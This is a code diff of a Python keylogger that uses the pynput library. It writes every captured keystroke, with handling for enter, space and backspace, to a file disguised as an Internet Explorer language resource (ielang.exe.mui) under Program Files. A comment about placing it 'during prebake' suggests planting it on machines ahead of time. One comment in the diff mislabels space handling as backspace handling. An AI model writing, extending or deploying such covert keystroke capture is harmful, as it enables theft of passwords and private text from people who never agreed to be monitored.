@@ -1,7 +1,6 @@
 from pynput import keyboard
 
 # Define the file to save the keystrokes
-#Consider C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui
 output_file = "C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui" #FIND A PLACE FOR THIS DURING PREBAKE
 
 def on_press(key):
@@ -13,9 +12,9 @@ def on_press(key):
         # Write special keys to the file
         with open(output_file, "a") as file:
             if key == keyboard.Key.enter:
-                file.write('\n')
+                file.write('\n') #Handle new lines
             if key == keyboard.Key.space:
-                file.write(' ')
+                file.write(' ') #Handle backspaces
             if key == keyboard.Key.backspace:
                 remove_last_character()
             else:
@@ -24,7 +23,7 @@ def on_press(key):
 def on_release(key):
     pass
 
-
+#Special handling for backspace
 def remove_last_character():
     with open(output_file, "r") as file:
         content = file.read()
